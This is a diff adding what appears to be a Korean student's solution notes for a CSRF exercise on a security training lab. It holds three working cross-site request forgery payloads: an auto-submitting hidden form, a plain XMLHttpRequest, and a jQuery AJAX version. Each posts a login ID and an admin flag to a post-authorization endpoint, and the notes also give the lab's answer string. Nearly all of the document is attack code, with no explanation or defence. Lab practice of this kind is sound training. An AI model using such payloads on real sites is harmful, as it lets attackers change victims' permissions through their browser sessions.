@@ -1,0 +1,69 @@
+CSRF 2번 문제
+
+copy URL: https://elms1.skinfosec.co.kr:8082/bbs11/updatePostAuth
+
+
+1. 공격 구문
+
+</form>
+<form id='attackForm' action='https://elms1.skinfosec.co.kr:8082/bbs11/updatePostAuth' method='post'>        
+        <input name="loginId" value="alsl1101@qwer.com"/>
+        <input name="adminYn" value="2"/>
+</form> 
+
+<script>
+document.getElementById('attackForm').submit();
+</script>
+<form>
+
+2. 정답
+
+skinfosec_post_answer
+
+
+
+
+
+--------쌩 JS--------
+
+<script>xhr = new XMLHttpRequest();
+var formData = new FormData(); 
+formData.append("loginId", "alsl1101@qwer.com");
+formData.append("adminYn", "2"); xhr.open("POST", "https://elms1.skinfosec.co.kr:8082/bbs11/updatePostAuth");
+xhr.send(formData);</script>
+
+
+
+--------jquery로 풀기------------
+
+</form>
+<form id='attackForm' action='https://elms1.skinfosec.co.kr:8082/bbs11/updatePostAuth' method='post'>        
+        <input name="loginId" value="alsl1101@qwer.com"/>
+        <input name="adminYn" value="2"/>
+</form> 
+
+<script>
+        $(document).ready(function(){
+                var formData = {
+                loginId: $("input[name='loginId']").val(),
+                adminYn: $("input[name='adminYn']").val()
+                };
+
+                $.ajax({
+                url: $('#attackForm').attr('action'),
+                type: 'POST',
+                data: formData,
+                success: function(response) {
+                        // 성공시 실행할 코드
+                        console.log("성공: ", response);
+                },
+                error: function(xhr, status, error) {
+                        // 오류시 실행할 코드
+                        console.error("오류: ", error);
+                }
+                });
+        });
+</script>
+<form>
+
+
